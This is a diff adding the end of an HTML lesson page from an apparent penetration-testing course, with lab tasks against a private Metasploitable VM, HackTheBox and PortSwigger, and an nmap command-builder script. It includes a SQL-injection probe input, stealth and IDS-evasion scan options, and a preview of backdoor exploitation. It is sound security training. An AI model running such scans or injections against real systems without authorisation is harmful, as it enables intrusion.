+  <div class="card">
+    <div class="clbl">LAB 1 — METASPLOITABLE FULL ENUMERATION (YOUR OWN LAB)</div>
+    <ul class="ck">
+      <li>Run the complete nmap scan suite against 192.168.56.101. Document every finding with CVE numbers.</li>
+      <li>Run Gobuster against http://192.168.56.101. Find and access /dvwa, /phpMyAdmin, /mutillidae. What are they?</li>
+      <li>Run Nikto. How many findings? Which are Critical?</li>
+      <li>Use enum4linux to dump all users, shares, and password policy. Document the password policy — what makes it insecure?</li>
+      <li>Set up Burp Suite. Browse to DVWA through Burp. In the "SQL Injection" section, test id=1' and document the MySQL error message. What does it reveal about the database?</li>
+      <li>Write a 1-page enumeration report: target summary, open services, critical findings, prioritized recommendations.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <div class="clbl">LAB 2 — HACKTHEBOX STARTING POINT (ONLINE)</div>
+    <ul class="ck">
+      <li>Create a free HackTheBox account at hackthebox.com</li>
+      <li>Complete <strong>"Meow"</strong> — Telnet service, default credentials. Apply nmap + manual service interaction.</li>
+      <li>Complete <strong>"Fawn"</strong> — FTP with anonymous login. Apply nmap + ftp-anon NSE + file extraction.</li>
+      <li>Complete <strong>"Dancing"</strong> — SMB share enumeration. Apply smbclient + flag retrieval from share.</li>
+      <li>Complete <strong>"Redeemer"</strong> — Redis enumeration. New service, same methodology: nmap → identify → enumerate → extract.</li>
+      <li>Document each machine: what did nmap find, what tool you used, and exactly what command got you the flag.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <div class="clbl">LAB 3 — PORTSWIGGER WEB ACADEMY (portswigger.net/web-security)</div>
+    <ul class="ck">
+      <li>Free labs from the makers of Burp Suite — the best web security training online.</li>
+      <li>Complete: <strong>"SQL injection UNION attack, determining the number of columns"</strong></li>
+      <li>Complete: <strong>"Reflected XSS into HTML context with nothing encoded"</strong></li>
+      <li>Complete: <strong>"Insecure direct object references"</strong></li>
+      <li>All use a browser-based environment — no setup needed. Use Burp alongside each lab.</li>
+    </ul>
+  </div>
+
+  <div class="slbl">// WEEK 4 PREVIEW</div>
+  <div class="card">
+    <div class="clbl">COMING NEXT — EXPLOITATION FUNDAMENTALS</div>
+    <div class="two">
+      <div>
+        <p style="color:#dde6ff;font-weight:600;margin-bottom:0.5rem">Day 22 — Metasploit Framework</p>
+        <ul class="ck" style="margin-top:0">
+          <li>msfconsole full workflow</li>
+          <li>Exploit the vsftpd 2.3.4 backdoor you found this week</li>
+          <li>Meterpreter post-exploitation basics</li>
+          <li>Staged vs stageless payloads</li>
+        </ul>
+      </div>
+      <div>
+        <p style="color:#dde6ff;font-weight:600;margin-bottom:0.5rem">Days 23–27 — Web Vulnerabilities</p>
+        <ul class="ck" style="margin-top:0">
+          <li>SQL injection — manual + sqlmap</li>
+          <li>XSS — reflected, stored, DOM-based</li>
+          <li>CSRF, SSRF, XXE deep dives</li>
+          <li>IDOR + broken access control</li>
+          <li>Password attacks: Hashcat + John</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <div class="note ny">
+    <div class="nico">✅</div>
+    <p><strong>Phase 2, Week 3 Readiness Check:</strong> Before moving to Week 4, confirm you can: (1) Build and explain any nmap command from memory, (2) Find hidden directories on a web server using Gobuster with the right wordlist, (3) Read a BloodHound graph and identify an attack path, (4) Set up Burp Suite proxy, intercept a login request, and send it to Repeater, (5) Identify at least 3 missing security headers from a curl response, (6) Complete all 4 HackTheBox Starting Point machines.</p>
+  </div>
+
+</div><!-- /p6 -->
+
+</div><!-- .wrap -->
+
+<footer>PHASE 2 · WEEK 3 COMPLETE · ENUMERATION & SCANNING · NEXT: WEEK 4 — EXPLOITATION FUNDAMENTALS</footer>
+
+<script>
+// DAY TABS
+function show(i){
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.dtab').forEach(t=>t.classList.remove('active'));
+  document.getElementById('p'+i).classList.add('active');
+  document.querySelectorAll('.dtab')[i].classList.add('active');
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+// QUIZ
+function qa(el,type,exp){
+  const q=el.closest('.qblock');
+  if(q.dataset.done)return;
+  q.dataset.done='1';
+  q.querySelectorAll('.qo').forEach(o=>{o.style.pointerEvents='none';o.style.opacity='0.4';});
+  el.style.opacity='1';el.classList.add(type);
+  const fb=q.querySelector('.qfb');
+  if(fb){fb.classList.add('show',type);fb.textContent=exp;}
+}
+
+// NMAP BUILDER
+const flags=new Set();
+const flagExplain={
+  '-sS':'SYN Stealth scan — sends SYN, receives SYN-ACK (open) or RST (closed), then immediately RSTs. Never completes the handshake, so many applications don\'t log it. Requires root privilege.',
+  '-sT':'Full TCP connect scan — completes the 3-way handshake. Fully logged. Slower but works without root privileges.',
+  '-sU':'UDP scan — probes UDP ports. Very slow (waits for ICMP "port unreachable"). Essential for finding DNS(53), SNMP(161), TFTP(69).',
+  '-sV':'Version detection — probes open ports to identify exact service and version. "Apache httpd 2.2.8" instead of just "http". Essential for CVE matching.',
+  '-sn':'Ping sweep — discovers live hosts without port scanning. ICMP + TCP SYN 443 + TCP ACK 80. Fast network inventory.',
+  '-O':'OS detection — analyzes TCP/IP quirks to fingerprint the operating system. TTL values, window sizes, TCP options all reveal OS identity.',
+  '-A':'Aggressive mode — enables OS detection, version detection, script scanning, and traceroute. Equivalent to -sV -O --script=default -traceroute. Noisy.',
+  '-Pn':'Skip host discovery (no ping) — treats all hosts as online. Use when ICMP is blocked by firewall.',
+  '--open':'Show only open ports — filters out closed and filtered ports from results. Cleaner output.',
+  '-p 80,443,22,21':'Scan specific ports — only checks port 80 (HTTP), 443 (HTTPS), 22 (SSH), 21 (FTP).',
+  '-p 1-1000':'Scan ports 1 through 1000 — covers well-known and registered port ranges.',
+  '-p-':'Scan ALL 65535 ports — comprehensive but slow. Always run this on high-value targets.',
+  '--top-ports 1000':'Scan the 1000 most commonly open ports — based on nmap\'s frequency data. Good balance of coverage and speed.',
+  '-T4':'Aggressive timing — fast scans suitable for CTFs and lab environments with reliable networks.',
+  '-T1':'Sneaky timing — very slow (15+ seconds between probes). Evades most threshold-based IDS detection rules.',
+  '-v':'Verbose output — shows ports as they are discovered rather than waiting until the scan completes.',
+  '-oA scan_results':'Save in all formats — creates scan_results.nmap (text), scan_results.xml, and scan_results.gnmap. Always save your nmap results.',
+  '--script=vuln':'Run all NSE vulnerability scripts — checks for dozens of CVEs automatically. Very loud but comprehensive.',
+};
+
+function toggleFlag(el){
+  const f=el.dataset.flag;
+  const g=el.dataset.group;
+  if(g){
+    document.querySelectorAll(`[data-group="${g}"]`).forEach(o=>{
+      if(o!==el){o.classList.remove('sel');flags.delete(o.dataset.flag);}
+    });
+  }
+  if(el.classList.contains('sel')){el.classList.remove('sel');flags.delete(f);}
+  else{el.classList.add('sel');flags.add(f);}
+  buildCmd();
+}
+function buildCmd(){
+  const target=document.getElementById('nmap-target').value.trim()||'<target>';
+  const fl=Array.from(flags);
+  const out=document.getElementById('nmap-out');
+  if(fl.length===0){out.innerHTML='nmap <span style="color:var(--muted)">← select options above</span>';return;}
+  out.textContent='nmap '+fl.join(' ')+' '+target;
+  document.getElementById('nmap-explain').textContent='';
+}
+function explainCmd(){
+  const fl=Array.from(flags);
+  if(fl.length===0){document.getElementById('nmap-explain').textContent='Select some options first.';return;}
+  const explanations=fl.map(f=>flagExplain[f]||f).join('\n\n');
+  document.getElementById('nmap-explain').textContent=explanations;
+}
+</script>
+
+<div class="week-nav" style="border-top-color:var(--border,#141b26);max-width:1160px;margin:2rem auto 0;padding:2rem;display:flex;justify-content:space-between;align-items:center;">
+  <a href="week2.html" style="color:var(--accent,#3b82f6);border-color:var(--border,#141b26);">← Previous Week</a>
+  <a href="../index.html" style="color:var(--teal,#2dd4bf);border-color:rgba(45,212,191,0.3);">⌂ Lesson Hub</a>
+  <a href="week4.html" style="color:var(--accent,#3b82f6);border-color:var(--border,#141b26);">Next Week →</a>
+</div>
+
+<a href="#" id="back-to-top" title="Back to top">↑</a>
+
+<script src="../js/shared.js"></script>
+</body>
+</html>
